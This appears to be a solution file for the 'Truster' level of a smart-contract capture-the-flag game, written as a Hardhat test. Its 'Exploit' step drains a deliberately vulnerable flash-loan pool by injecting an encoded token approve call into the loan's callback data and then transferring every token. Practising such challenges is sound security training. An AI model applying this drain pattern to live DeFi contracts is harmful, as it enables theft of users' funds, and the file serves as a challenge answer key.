const { ethers, web3 } = require("hardhat");
const { expect } = require("chai");

const APPROVE_JSON_INTERFACE = {
  inputs: [
    {
      internalType: "address",
      name: "spender",
      type: "address",
    },
    {
      internalType: "uint256",
      name: "amount",
      type: "uint256",
    },
  ],
  name: "approve",
  outputs: [
    {
      internalType: "bool",
      name: "",
      type: "bool",
    },
  ],
  stateMutability: "nonpayable",
  type: "function",
};

describe("[Challenge] Truster", function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
    const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async function () {
    const LenderAttackerFactory = await ethers.getContractFactory("LenderAttacker");
    this.lenderAttacker = await LenderAttackerFactory.deploy(attacker.address, this.token.address);

    const poolBalance = await this.token.balanceOf(this.pool.address);
    const approveCall = web3.eth.abi.encodeFunctionCall(APPROVE_JSON_INTERFACE, [attacker.address, poolBalance]);

    await this.pool.flashLoan(0, attacker.address, this.token.address, approveCall);
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, poolBalance);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
  });
});
